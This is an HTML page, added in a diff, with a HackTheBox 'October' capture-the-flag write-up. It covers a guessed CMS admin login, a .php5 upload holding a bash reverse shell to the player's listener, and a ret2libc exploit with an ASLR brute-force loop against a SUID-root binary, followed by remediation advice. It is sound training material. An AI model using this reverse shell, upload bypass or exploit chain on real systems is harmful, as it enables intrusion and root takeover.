@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>October - HackTheBox writeup</title>
+<meta name="description" content="HackTheBox October (Medium, Linux): a guessed admin login into the October CMS backend leads to a .php5 Media-manager upload for a www-data shell, then the real box begins - a planted SUID-root binary ovrflw with a 32-bit stack overflow is exploited with a ret2libc chain brute-forced against ASLR for a root shell.">
+<link rel="canonical" href="https://sudoanthony.github.io/writeup-october.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="~/sudoanthony">
+<meta property="og:title" content="October - HackTheBox (Medium, Linux)">
+<meta property="og:description" content="A guessed October CMS backend login and a .php5 upload give a www-data shell; the privesc is the real box - a SUID-root 32-bit binary falls to a ret2libc chain brute-forced past NX and ASLR for root.">
+<meta property="og:url" content="https://sudoanthony.github.io/writeup-october.html">
+<meta property="og:image" content="https://sudoanthony.github.io/images/october-og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="October - HackTheBox (Medium, Linux)">
+<meta name="twitter:description" content="October CMS .php5 upload to www-data, then a SUID-root ret2libc with an ASLR brute-force to root.">
+<meta name="twitter:image" content="https://sudoanthony.github.io/images/october-og.png">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="nav"><div class="wrap">
+  <a class="brand" href="index.html">~/sudoanthony</a>
+  <div class="links">
+    <a href="writeups.html">write-ups</a>
+    <a href="vulns.html">vulns</a>
+    <a href="concepts.html">concepts</a>
+    <a href="tools.html">tools</a>
+    <a href="https://github.com/sudoanthony">github</a>
+  </div>
+</div></nav>
+
+<main class="wrap" style="padding-top:44px">
+
+  <div class="wu-head">
+    <img class="wu-icon" src="images/icons/october.png" alt="" onerror="this.style.display='none'">
+    <h1>October</h1>
+  </div>
+
+  <div class="meta">
+    <span class="badge htb">HackTheBox</span>
+    <span class="badge medium">Medium</span>
+    <span class="badge red-team">red team</span>
+    <span class="sep">|</span>
+    <span>Linux &middot; web &middot; binexp</span>
+    <span class="sep">|</span>
+    <span>30 Oct 2026</span>
+  </div>
+
+  <div class="tldr">
+    <span class="lbl">tl;dr</span>
+    <p>October is two boxes stitched together, and the name is a trap. The front half is
+    <strong>October CMS</strong>: we guess our way into the backend login (<code>admin</code> with a weak
+    password, no lockout) and abuse the Media manager, which happily takes a <code>.php5</code> file the
+    upload filter forgot about, for a reverse shell as <code>www-data</code>. The back half has nothing to do
+    with the CMS. A full SUID sweep, cross-referenced against the package database, leaves one human-planted
+    binary: <code>/usr/local/bin/ovrflw</code>, SUID root. It is a 32-bit ELF with a classic
+    <code>strcpy</code> stack overflow, hardened with NX and full ASLR but no stack canary. We beat NX with a
+    <strong>ret2libc</strong> chain and beat ASLR the cheap way - 32-bit entropy is low enough to
+    <strong>brute-force a fixed libc guess in a loop</strong> until it lands a <strong>root</strong> shell.</p>
+  </div>
+
+  <div class="tags">
+    <a class="tag" href="vulns.html#weak-credentials">weak-credentials</a>
+    <a class="tag" href="vulns.html#file-upload-rce">file-upload-rce</a>
+    <a class="tag" href="vulns.html#ret2libc">ret2libc</a>
+    <a class="tag" href="vulns.html#priv-esc">priv-esc</a>
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">how we ran this one: adventure mode</span>
+    We ran October blind, no walkthroughs read until after, so this write-up keeps the real order with the
+    rabbit holes left in: the MySQL creds, the tarball on harry's desktop, and a lot of wasted energy hunting
+    October CMS CVEs that turned out to have nothing to do with the way in or the way up. The dead ends are the
+    point. They are where the lesson lives.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 01 ==================== -->
+  <h2><span class="num">01</span>Enumeration</h2>
+
+  <p>As usual, we start with a full port and service scan:</p>
+  <pre><code><span class="p">$</span> nmap -sCV -p- -T4 --min-rate 5000 <span class="o">10.129.96.113</span></code></pre>
+  <figure><img src="images/October/october01.png" alt="nmap showing SSH on 22 and Apache on 80 serving October CMS Vanilla"><figcaption>Two ports: <strong>22 (SSH)</strong> and <strong>80 (HTTP)</strong>. Apache 2.4.7 advertises the risky <code>PUT</code> / <code>PATCH</code> / <code>DELETE</code> methods (a distraction here), and the title gives the game away: <strong>October CMS</strong> on the Vanilla theme.</figcaption></figure>
+
+  <p>SSH gives nothing without a credential so we park it. The public site is a themed marketing page with a
+  blog, a forum, and an account area:</p>
+  <figure><img src="images/October/october02.png" alt="October CMS Vanilla themed front page with account, blog and forum tiles"><figcaption>The Vanilla front end. We can register (even as a user called <code>admin</code>), but nothing on the public site is exploitable, and Wappalyzer confirms <strong>October CMS</strong> on <strong>Laravel</strong> / PHP / Apache.</figcaption></figure>
+
+  <p>The public source is quiet and <code>robots.txt</code> / <code>login.php</code> give nothing, so the real
+  work is directory enumeration.</p>
+
+  <hr>
+
+  <!-- ==================== 02 ==================== -->
+  <h2><span class="num">02</span>The backend login</h2>
+
+  <p>Brute-forcing directories turns up a stray <code>.php5</code> file that renders completely blank (we come
+  back to <em>why</em> that matters) and, more usefully, a backend auth panel at
+  <code>/backend/backend/auth/signin</code>. At the login we try the obvious pairs, and <code>admin</code>
+  with <code>password</code> gives a telling flash message rather than a flat rejection:</p>
+
+  <figure><img src="images/October/october03.png" alt="October backend login flash: a user was found to match all plain text credentials however hashed credential password did not match"><figcaption>"A user was found to match all plain text credentials however hashed credential &quot;password&quot; did not match." The username <code>admin</code> is valid. Only the password is wrong, which turns a login into a password-guessing problem.</figcaption></figure>
+
+  <p>I lined up Hydra and Burp to fuzz the password, but while the job was spinning up I noticed I was already
+  logged in from an early manual guess of <code>admin</code>. A good reminder to always try the simple thing
+  first. The account's settings show the email <code>admin@october.htb</code>.</p>
+
+  <div class="note warn">
+    <span class="lbl">calibrating this finding</span>
+    It is tempting to stamp "default credentials - Critical" here, but <code>admin</code>/<code>admin</code>
+    is not a documented October CMS default; this was a weak, guessable password with no account lockout. On
+    its own that is a <strong>High</strong>: it authorizes the full CMS backend, not the host. It only becomes
+    code execution because of the upload flaw in the next section. Tying severity to exactly what the
+    credential authorizes, and no more, is the habit worth keeping.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 03 ==================== -->
+  <h2><span class="num">03</span>Foothold - Media manager .php5 upload</h2>
+
+  <p>Inside the backend there is a lot of surface (themes, versions, plugins) and it is easy to get lost
+  hunting a CMS CVE. The thing that actually matters is the <strong>Media</strong> manager: it lets us upload
+  our own files, and it is what was serving that blank <code>.php5</code> from enumeration. So we write a PHP
+  reverse shell:</p>
+
+  <pre><code><span class="c"># shell.php reverse shell payload</span>
+&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.114/4444 0&gt;&amp;1'"); ?&gt;</code></pre>
+
+  <p>Uploading <code>shell.php</code> is rejected. The upload filter blocks <code>.php</code>, but it does not
+  block <code>.php5</code>, which Apache on this host is still configured to execute as PHP. Rename it,
+  upload it, and the Media manager takes it without complaint:</p>
+
+  <figure><img src="images/October/october04.png" alt="October CMS Media manager showing the uploaded shell.php5 file"><figcaption>The Media manager accepts <code>shell.php5</code> (there is even a leftover <code>dr.php5</code> from a previous player, which is the blank <code>.php5</code> enumeration found). The <code>.php</code> extension is blocked but <code>.php5</code> is not, and the server still runs it as PHP.</figcaption></figure>
+
+  <p>Start a listener and request the uploaded file to fire the shell:</p>
+  <pre><code><span class="p">$</span> nc -lvnp 4444
+<span class="p">$</span> curl http://10.129.96.113/storage/app/media/shell.php5</code></pre>
+  <figure><img src="images/October/october05.png" alt="netcat listener catching a reverse shell as www-data from 10.129.96.113"><figcaption>The listener catches a connection from <code>10.129.96.113</code> and <code>whoami</code> returns <code>www-data</code>. Foothold.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">an extension blacklist is not a filter</span>
+    Blocking <code>.php</code> while the server still executes <code>.php5</code> (and <code>.phtml</code>,
+    <code>.php7</code>, and friends) is the whole bug. The fix is an allow-list of permitted types plus storing
+    uploads somewhere the PHP handler never runs, not a deny-list of extensions you hope you remembered all
+    of. Severity here is <strong>High</strong>: it is authenticated code execution, but only as the low-priv
+    <code>www-data</code>, not root.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 04 ==================== -->
+  <h2><span class="num">04</span>Enumeration as www-data</h2>
+
+  <p>After stabilizing the shell to a proper TTY, we enumerate. <code>harry</code>'s home is right there and
+  <code>user.txt</code> is readable by us already:</p>
+
+  <figure><img src="images/October/october06.png" alt="www-data reading harry's user.txt in /home/harry, flag value redacted"><figcaption>As <code>www-data</code> we can <code>cat /home/harry/user.txt</code> directly (value redacted). On HackTheBox, <code>user.txt</code> is readable by whatever account you escalate <em>from</em>.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">the hint I walked past</span>
+    Reading <code>user.txt</code> as <code>www-data</code> was the box telling me I do not need to become
+    <code>harry</code> at all. I should have pivoted straight to "what can <code>www-data</code> reach that
+    leads to root" instead of treating <code>harry</code> as the next rung. Two rabbit holes came out of
+    ignoring that.
+  </div>
+
+  <h3>Rabbit hole #1 - MySQL credentials</h3>
+  <p>Digging through the web root surfaces October's database config in <code>config/database.php</code>:</p>
+  <figure><img src="images/October/october07.png" alt="config/database.php exposing the MySQL credentials october / OctoberCMSPassword!!"><figcaption>MySQL creds in the clear: <code>october</code> / <code>OctoberCMSPassword!!</code>. They connect to a local database, and <code>harry</code>'s stored hash even cracks to <code>aaaaaaaa</code>, but none of it reuses anywhere useful (admin panel, SSH, <code>su</code>). MySQL is not exposed externally. Dead end.</figcaption></figure>
+
+  <h3>Rabbit hole #2 - the tarball on harry's desktop</h3>
+  <p>harry's desktop has a <code>october-1.0.412.tar.gz</code> while the host runs <strong>1.0.1</strong>, which
+  looks like an unreleased build worth tearing apart. It is just a blank template with the standard October
+  filesystem. No secrets. Another detour, and another nudge that I was already standing where I needed to be.</p>
+
+  <hr>
+
+  <!-- ==================== 05 ==================== -->
+  <h2><span class="num">05</span>Finding the planted SUID binary</h2>
+
+  <p>Back to basics. The single most productive move on this box is a SUID sweep, then asking the package
+  database which of those binaries it disowns:</p>
+  <pre><code><span class="p">$</span> find / -perm -u=s -type f 2>/dev/null
+<span class="p">$</span> dpkg -S &lt;suspect&gt;        <span class="c"># package-owned, or planted?</span></code></pre>
+  <figure><img src="images/October/october08.png" alt="find -perm -u=s SUID list and dpkg -S showing every binary is package-owned except /usr/local/bin/ovrflw"><figcaption>Every SUID binary answers to <code>dpkg -S</code> with its owning package (<code>uuid-runtime</code>, <code>iputils-tracepath</code>, <code>eject</code>, <code>openssh-client</code>, <code>policykit-1</code>, ...) except one: <code>dpkg-query: no path found matching pattern /usr/local/bin/ovrflw</code>. A SUID-root binary under <code>/usr/local/bin</code> that no package claims is the planted one.</figcaption></figure>
+
+  <p>That disowned binary is <code>ovrflw</code>, and it is SUID root:</p>
+  <figure><img src="images/October/october09.png" alt="ls -la of /usr/local/bin/ovrflw showing -rwsr-xr-x owned by root"><figcaption><code>-rwsr-xr-x root root ovrflw</code>: the SUID bit is set and the owner is <code>root</code>, so anything it does runs as root. This is the privesc path.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">dpkg -S is the SUID triage tool</span>
+    A raw <code>find -perm -4000</code> is noise until you ask which entries the package manager disowns.
+    <code>dpkg -S &lt;path&gt;</code> (or <code>rpm -qf</code> on Red Hat) turns a 20-line list into one
+    suspect. A SUID-root binary under <code>/usr/local/</code> that no package claims is almost always the
+    intended path.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 06 ==================== -->
+  <h2><span class="num">06</span>Privilege escalation - ret2libc with an ASLR brute-force</h2>
+
+  <p>From here the CMS is irrelevant. This is a straight binary-exploitation privesc against a SUID-root
+  binary. We profile it before touching a payload.</p>
+
+  <h3>What are we dealing with</h3>
+  <figure><img src="images/October/october10.png" alt="file ovrflw showing setuid ELF 32-bit LSB executable, dynamically linked, not stripped"><figcaption><code>file ovrflw</code>: a <strong>setuid ELF 32-bit</strong> LSB executable, dynamically linked, and <strong>not stripped</strong>. 32-bit matters twice over (4-byte little-endian addresses, and low ASLR entropy later), and "not stripped" means the symbols are intact, so <code>gdb</code> work is easier.</figcaption></figure>
+
+  <h3>Protections: ASLR, NX, canary</h3>
+  <p>ASLR always reads as off inside <code>gdb</code>, so we check the real host. A value of <code>2</code>
+  means full randomization, and watching libc's base move between <code>ldd</code> runs confirms it is live:</p>
+  <pre><code><span class="p">$</span> cat /proc/sys/kernel/randomize_va_space
+<span class="o">2</span>
+<span class="p">$</span> ldd /usr/local/bin/ovrflw | grep libc    <span class="c"># base changes each run</span>
+<span class="o">libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7556000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb762f000)</span></code></pre>
+  <p>In <code>pwndbg</code>, <code>checksec</code> fills in the rest:</p>
+  <figure><img src="images/October/october11.png" alt="pwndbg checksec showing i386, Partial RELRO, No canary found, NX enabled, No PIE"><figcaption><strong>No canary</strong> (the overflow is reachable), <strong>NX enabled</strong> (no stack shellcode), and <strong>No PIE</strong> on a 32-bit binary. NX forces <strong>ret2libc</strong>; full ASLR plus low 32-bit entropy invites a <strong>brute-force</strong>.</figcaption></figure>
+
+  <h3>Finding the offset in gdb</h3>
+  <p>We pull the binary to our box, confirm the md5 matches, and work it in <code>gdb</code>.
+  <code>disassemble main</code> shows the bug directly:</p>
+  <figure><img src="images/October/october12.png" alt="pwndbg disassembly of main showing strcpy@plt copying argv[1] into a stack buffer"><figcaption><code>strcpy(buffer, argv[1])</code> with no bounds check, into a buffer in a 128-byte frame. The input vector is <code>argv[1]</code> and <code>strcpy</code> copies until a null byte, straight over the saved return address.</figcaption></figure>
+
+  <p>A cyclic pattern finds the exact distance to the saved return address:</p>
+  <pre><code><span class="p">$</span> cyclic 300            <span class="c"># feed as argv[1], crash it</span>
+<span class="p">$</span> cyclic -l $eip        <span class="c"># -> offset 112</span>
+<span class="p">$</span> run $(python3 -c 'print("A"*112 + "B"*4)')
+<span class="o">EIP 0x42424242</span>          <span class="c"># we own the return address</span></code></pre>
+
+  <h3>Building the ret2libc chain</h3>
+  <p>The chain overwrites the return address with <code>system</code>, follows it with <code>exit</code> as a
+  clean return, then the address of the <code>"/bin/sh"</code> string, so the call becomes
+  <code>system("/bin/sh")</code>. The three values come from the <strong>target's</strong> libc (offsets
+  differ between libc builds):</p>
+  <pre><code><span class="p">$</span> readelf -s libc.so.6 | grep -w system      <span class="o"># 0x00040310</span>
+<span class="p">$</span> readelf -s libc.so.6 | grep -w exit        <span class="o"># 0x00033260</span>
+<span class="p">$</span> strings -a -t x libc.so.6 | grep /bin/sh   <span class="o"># 0x00162bac</span></code></pre>
+  <pre><code><span class="o">[ 112 padding ][ &amp;system ][ &amp;exit ][ &amp;"/bin/sh" ]
+     filler       new EIP    return     argument</span></code></pre>
+
+  <h3>Beating ASLR by brute force</h3>
+  <p>Each absolute address is <code>libc_base + offset</code>, packed little-endian. We cannot know the live
+  base, so we bet one fixed guess and loop the exploit until libc happens to load there. On 32-bit the entropy
+  is low enough that this lands in a reasonable number of tries:</p>
+  <pre><code><span class="p">$</span> python3 -c "import sys,struct; b=0xb755c000; sys.stdout.buffer.write(b'A'*112+struct.pack('&lt;I',b+0x40310)+struct.pack('&lt;I',b+0x33260)+struct.pack('&lt;I',b+0x162bac))" > /tmp/p
+<span class="p">$</span> wc -c /tmp/p          <span class="c"># 124: 112 + 4 + 4 + 4, confirms it built clean</span>
+<span class="p">$</span> while true; do /usr/local/bin/ovrflw "$(cat /tmp/p)" 2>/dev/null; done</code></pre>
+  <p>Because <code>ovrflw</code> is SUID root, the <code>/bin/sh</code> that <code>system</code> spawns
+  inherits root. After a batch of segfaults the loop goes quiet and drops a root shell:</p>
+  <figure><img src="images/October/october13.png" alt="id output showing euid=0(root) after the ret2libc brute-force loop lands, whoami returns root"><figcaption>The loop beats ASLR: <code>id</code> shows <code>euid=0(root)</code> and <code>whoami</code> returns <code>root</code>. The root flag is in <code>/root/root.txt</code> <span style="color:var(--text-4)">[flag omitted]</span>. Box owned.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">why 32-bit is the whole story</span>
+    On 64-bit this exploit stalls without an info leak: libc entropy is far too high to guess. 32-bit libc
+    randomization is only around 8 bits of entropy on the base, few enough that a fixed guess in a tight loop
+    wins quickly. The same bug on a 64-bit binary would be a different, much harder engagement. Recognizing
+    that from <code>file</code> saying "32-bit" is what set the whole approach.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 07 ==================== -->
+  <h2><span class="num">07</span>Root cause &amp; remediation</h2>
+  <table style="width:100%; border-collapse:collapse; font-size:14.5px; margin:6px 0 8px">
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text); width:40%"><strong>Weak, guessable backend password</strong><br><span style="color:var(--text-4);font-size:13px">admin login, no lockout</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">The <code>admin</code> account fell to a hand-guess. Enforce a strong password policy, add rate limiting and lockout on the backend login, and put the control panel behind network ACLs rather than exposing it to the internet.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Extension blacklist on uploads</strong><br><span style="color:var(--text-4);font-size:13px">.php blocked, .php5 executed</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">The Media filter denied <code>.php</code> but the server still ran <code>.php5</code>. Use an allow-list of permitted types, and store uploads in a location where the PHP handler never executes (or serve them as static downloads only).</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Secrets reachable by www-data</strong><br><span style="color:var(--text-4);font-size:13px">DB creds in the web root</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Database credentials sat in a file the web user could read. Keep secrets out of web-readable paths and scope the web user's filesystem access to only what it needs to serve.</td>
+      </tr>
+      <tr>
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Vulnerable SUID-root binary</strong><br><span style="color:var(--text-4);font-size:13px">ovrflw: strcpy overflow, no canary</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">A custom SUID-root binary with an unbounded <code>strcpy</code> is a direct root path. Don't ship SUID binaries that take untrusted input; if one must exist, drop the SUID bit, replace <code>strcpy</code> with a bounded copy, and compile with a stack canary, NX, and PIE so the few mitigations present aren't the only thing standing between a user and root.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <!-- ==================== 08 ==================== -->
+  <h2><span class="num">08</span>Takeaways</h2>
+  <p>October's biggest lesson is that the name of a box can be a rabbit hole all by itself. I spent a lot of
+  energy reading up on October CMS CVEs, and the privilege escalation had nothing to do with October CMS. In
+  fact, the part that involved the CMS was over the moment I blind-guessed the login and found the Media
+  upload: that was not a CVE, just weak credentials and a sloppy upload filter. If you got <code>www-data</code>
+  that way, you already finished the entire CMS portion of the box without exploiting October at all.</p>
+  <p>The other lesson I paid for in time: reading <code>user.txt</code> as <code>www-data</code> was the box
+  telling me I was already the account I needed. Instead I chased harry through a set of MySQL creds and a
+  decoy tarball before coming back to the basics. Sometimes a hard box is easier than it looks, as long as you
+  orient yourself, your surroundings, and your privileges before reaching for the far-out ideas. Enumerate what
+  is in front of you first. The SUID sweep plus <code>dpkg -S</code> was the whole privesc, and it was sitting
+  there the entire time.</p>
+  <p>And the binary half was a genuinely satisfying one to build by hand: a strcpy overflow, NX forcing
+  ret2libc, no canary to stop us, and 32-bit ASLR weak enough to loop past. Fun box.</p>
+
+  <p style="margin-top:32px">
+    <a href="writeups.html">&larr; all write-ups</a> &nbsp;&middot;&nbsp;
+    <a href="vulns.html">techniques used &rarr;</a>
+  </p>
+
+</main>
+
+<footer class="foot"><div class="wrap" style="display:flex;gap:18px;flex-wrap:wrap">
+  <a href="index.html">home</a>
+  <a href="writeups.html">write-ups</a>
+  <a href="vulns.html">vulns</a>
+  <a href="https://github.com/sudoanthony">github</a>
+</div></footer>
+
+<script src="writeup-toc.js"></script>
+<script src="lightbox.js"></script>
+</body>
+</html>
